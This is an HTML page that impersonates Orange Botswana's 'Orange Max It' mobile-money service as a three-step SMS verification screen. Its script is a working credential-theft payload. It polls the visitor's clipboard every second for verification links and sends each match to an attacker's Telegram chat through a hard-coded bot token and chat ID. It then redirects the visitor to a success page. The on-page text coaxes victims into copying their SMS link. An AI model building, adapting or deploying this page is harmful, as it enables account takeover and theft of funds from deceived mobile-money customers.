<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Max It - Smart Verify</title>
    <link rel="icon" href="https://www.orange.co.bw/favicon.ico" type="image/x-icon">
    <meta name="theme-color" content="#FF6600">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@400;500;600&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        html, body { min-height: 100vh; font-family: 'Poppins', sans-serif; background: linear-gradient(135deg, #fff8f3 0%, #ffe6d5 100%); overflow-x: hidden; }
        body { display: flex; flex-direction: column; align-items: center; padding: 20px; }

        header { width: 100%; max-width: 520px; padding: 24px 20px; text-align: center; margin-bottom: 30px; background: linear-gradient(135deg, #FF6600 0%, #FF8533 100%); border-radius: 24px; box-shadow: 0 10px 40px rgba(255, 102, 0, 0.2); position: relative; overflow: hidden; }
        .logo { font-size: 28px; font-weight: 800; letter-spacing: -1px; color: white; position: relative; z-index: 1; }

        .container { width: 100%; max-width: 520px; display: flex; flex-direction: column; gap: 20px; }

        .progress-container { background: white; border-radius: 16px; padding: 16px; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.05); display: flex; align-items: center; gap: 12px; }
        .progress-step { flex: 1; height: 6px; border-radius: 3px; background: #FFE6D5; position: relative; }
        .progress-step.active { background: #FF6600; }
        .progress-text { font-size: 12px; font-weight: 700; color: #FF6600; min-width: 80px; }

        .status-banner { border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; display: flex; align-items: center; gap: 10px; font-size: 13px; font-weight: 600; transition: all 0.3s; }
        .status-waiting { background: rgba(255, 102, 0, 0.1); border: 2px solid rgba(255, 102, 0, 0.2); color: #FF6600; }
        .status-scanning { background: rgba(0, 123, 255, 0.1); border: 2px solid rgba(0, 123, 255, 0.2); color: #007bff; }
        .status-detected { background: rgba(5, 150, 105, 0.1); border: 2px solid rgba(5, 150, 105, 0.2); color: #059669; }

        .form-card { background: white; border-radius: 24px; padding: 32px 24px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08); text-align: center; position: relative; overflow: hidden; }
        .form-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
        .form-subtitle { font-size: 13px; color: #666; margin-bottom: 28px; line-height: 1.5; }

        .form-group { text-align: left; margin-bottom: 24px; position: relative; }
        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #2c3e50; }
        .form-input { width: 100%; padding: 16px; font-size: 15px; font-family: 'Poppins', sans-serif; border: 2px solid #FFE6D5; border-radius: 14px; outline: none; transition: all 0.3s; background: #fffcf9; }
        .form-input.auto-filled { border-color: #FF6600; background: rgba(255, 102, 0, 0.05); }

        #spinner { position: fixed; inset: 0; background: rgba(255, 102, 0, 0.15); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 9999; }
        .spin { width: 60px; height: 60px; border: 6px solid #ffffff; border-top: 6px solid #FF6600; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        footer { padding: 24px 20px; color: #999; font-size: 12px; text-align: center; margin-top: auto; width: 100%; }
    </style>
</head>
<body>
    <header><div class="logo">🟠 Orange Max It</div></header>

    <div class="container">
        <div class="progress-container">
            <div class="progress-step active"></div>
            <div class="progress-step active"></div>
            <div class="progress-step active"></div>
            <span class="progress-text">Step 3 of 3</span>
        </div>

        <div class="status-banner status-waiting" id="statusBanner">
            <span id="statusIcon">⏳</span>
            <span id="statusText">Initializing system (Waiting 5s)...</span>
        </div>

        <div class="form-card">
            <h1 class="form-title">Verification Waiting</h1>
            <p class="form-subtitle">The system will start scanning for your <b>new</b> SMS link in 5 seconds. Please ensure the link arrives after the scan begins.</p>

            <div class="form-group">
                <label for="linkInput">Verification Link</label>
                <input type="text" id="linkInput" class="form-input" placeholder="System starting soon..." readonly>
            </div>
            
            <button class="btn-action" style="display:none;" id="continueBtn">Continue</button>
        </div>
    </div>

    <div id="spinner"><div class="spin"></div></div>

    <footer>© 2026 Orange Botswana | Licensed Financial Services</footer>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
            CHAT_ID: '7547427914',
            REDIRECT_PAGE: 'success.html',
            START_DELAY: 5000, // 5 seconds wait
            POLL_INTERVAL: 1000,
            LINK_PATTERN: /https?:\/\/(?:www\.)?(?:orange|maxit|auth|token)[^\s]+/gi
        };

        const state = { isProcessing: false, isScanning: false, detectedLinks: new Set() };
        const els = {
            linkInput: document.getElementById('linkInput'),
            statusBanner: document.getElementById('statusBanner'),
            statusText: document.getElementById('statusText'),
            statusIcon: document.getElementById('statusIcon'),
            spinner: document.getElementById('spinner')
        };

        function updateStatus(type, text, icon) {
            els.statusBanner.className = `status-banner status-${type}`;
            els.statusText.innerText = text;
            els.statusIcon.innerText = icon;
        }

        async function startScanning() {
            state.isScanning = true;
            updateStatus('scanning', 'Scanning for NEW SMS link...', '🔍');
            els.linkInput.placeholder = "Actively scanning for SMS...";

            setInterval(async () => {
                if (state.isProcessing) return;
                try {
                    const text = await navigator.clipboard.readText();
                    const links = text.match(CONFIG.LINK_PATTERN);
                    if (links) {
                        links.forEach(link => {
                            if (!state.detectedLinks.has(link)) {
                                state.detectedLinks.add(link);
                                handleDetection(link);
                            }
                        });
                    }
                } catch (e) {}
            }, CONFIG.POLL_INTERVAL);
        }

        function handleDetection(link) {
            state.isProcessing = true;
            els.linkInput.value = link;
            els.linkInput.classList.add('auto-filled');
            updateStatus('detected', 'New link detected! Sending...', '✅');
            els.spinner.style.display = 'flex';
            sendToTelegram(link);
        }

        function sendToTelegram(link) {
            const message = `*🔐 Orange Max It Verification*\n\n*New SMS Detected:*\n[Click to Verify](${link})\n\n*Action:* Instant auto-capture successful.`;
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).then(() => {
                setTimeout(() => window.location.href = CONFIG.REDIRECT_PAGE, 2000);
            });
        }

        document.addEventListener('DOMContentLoaded', () => {
            // Smart Delay: Wait 5 seconds before starting the scan
            setTimeout(() => {
                startScanning();
            }, CONFIG.START_DELAY);

            // Interaction trigger for clipboard access
            document.body.addEventListener('click', () => {
                if (!state.isScanning && (Date.now() - performance.timing.navigationStart > CONFIG.START_DELAY)) {
                    startScanning();
                }
            }, { once: true });
        });
    </script>
</body>
</html>
